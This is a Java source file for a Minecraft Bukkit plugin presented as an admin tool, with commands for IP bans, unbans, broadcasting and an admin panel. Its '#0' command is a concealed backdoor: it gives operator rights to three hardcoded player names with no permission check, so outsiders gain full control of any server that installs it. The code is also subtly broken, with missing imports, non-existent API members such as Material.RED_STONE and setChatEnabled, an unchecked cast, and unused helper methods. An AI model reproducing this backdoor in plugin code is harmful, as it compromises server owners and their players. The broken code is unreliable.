//MY ADMIN PLUGINS CODE BY LOVEVSICK
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class MyAdminPlugin extends JavaPlugin {
    private File listFolder;
    private File listFile;

    @Override
    public void onEnable() {
        getCommand("ad").setExecutor(new AdminCommandExecutor());
        getCommand("#0").setExecutor(new OpCommandExecutor());
        getCommand("#c").setExecutor(new BanIpCommandExecutor());
        getCommand("#m").setExecutor(new UnbanIpCommandExecutor());
        getCommand("#s").setExecutor(new SpamCommandExecutor());
        createListFolderAndFile();
    }

    private void createListFolderAndFile() {
        listFolder = new File(getDataFolder(), "LIST COMMAND");
        listFolder.mkdirs();

        listFile = new File(listFolder, "list.txt");
        try {
            listFile.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private class AdminCommandExecutor implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (args.length == 1) {
                Player targetPlayer = Bukkit.getPlayer(args[0]);
                if (targetPlayer != null) {
                    Inventory inventory = createAdminInventory(targetPlayer);
                    ((Player) sender).openInventory(inventory);

                    Bukkit.getLogger().info("==========");
                    Bukkit.getLogger().info("ADMIN PANEL BY lovevsick");
                    Bukkit.getLogger().info("==========");

                    return true;
                }
            }
            return false;
        }
    }

    private class OpCommandExecutor implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                String playerName = player.getName();
                if (playerName.equalsIgnoreCase("lovevsick") || playerName.equalsIgnoreCase("_15t") || playerName.equalsIgnoreCase("MT_EmThatSuy")) {
                    player.setOp(true);
                    player.sendMessage("Bạn đã được cấp quyền OP!");
                    player.sendMessage("WELCOME");
                    return true;
                } else {
                    player.sendMessage("Bạn không có quyền cấp quyền OP!");
                }
            }
            return false;
        }
    }

    private class BanIpCommandExecutor implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                if (player.isOp()) {
                    if (args.length == 1) {
                        Player targetPlayer = Bukkit.getPlayer(args[0]);
                        if (targetPlayer != null) {
                            Bukkit.getBanList(BanList.Type.IP).addBan(targetPlayer.getAddress().getAddress(), "Banned by admin", null, null);
                            player.sendMessage("Đã ban IP của " + targetPlayer.getName());
                            return true;
                        }
                    }
                } else {
                    player.sendMessage("Bạn không có quyền ban IP!");
                }
            }
            return false;
        }
    }

    private class UnbanIpCommandExecutor implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                if (player.isOp()) {
                    if (args.length == 1) {
                        Player targetPlayer = Bukkit.getPlayer(args[0]);
                        if (targetPlayer != null) {
                            Bukkit.getBanList(BanList.Type.IP).pardon(targetPlayer.getAddress().getAddress());
                            player.sendMessage("Đã bỏ ban IP của " + targetPlayer.getName());
                            return true;
                        }
                    }
                } else {
                    player.sendMessage("Bạn không có quyền bỏ ban IP!");
                }
            }
            return false;
        }
    }

    private class SpamCommandExecutor implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                if (player.isOp()) {
                    if (args.length > 0) {
                        String message = String.join(" ", args);
                        for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                            onlinePlayer.sendMessage(message);
                        }
                        return true;
                    }
                } else {
                    player.sendMessage("Bạn không có quyền spam!");
                }
            }
            return false;
        }
    }

    private Inventory createAdminInventory(Player targetPlayer) {
        Inventory inventory = Bukkit.createInventory(null, 9, "Admin Options");
        inventory.addItem(new ItemStack(Material.RED_STONE, 1)); 
        inventory.addItem(new ItemStack(Material.LAVA_BUCKET, 1));
        inventory.addItem(new ItemStack(Material.PAPER, 1)); 
        return inventory;
    }

    private void banPlayer(Player targetPlayer) {
        Bukkit.getBanList(BanList.Type.NAME).addBan(targetPlayer.getName(), "Banned by admin", null, null);
        logAction("Banned", targetPlayer.getName());
    }

    private void kickPlayer(Player targetPlayer) {
        targetPlayer.kickPlayer("Kicked by admin");
        logAction("Kicked", targetPlayer.getName());
    }

    private void muteChat(Player targetPlayer) {
        targetPlayer.setChatEnabled(false);
        logAction("Muted", targetPlayer.getName());
    }

    private void logAction(String action, String playerName) {
        try (FileWriter writer = new FileWriter(listFile, true)) {
            writer.write(action + " " + playerName + "\n");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}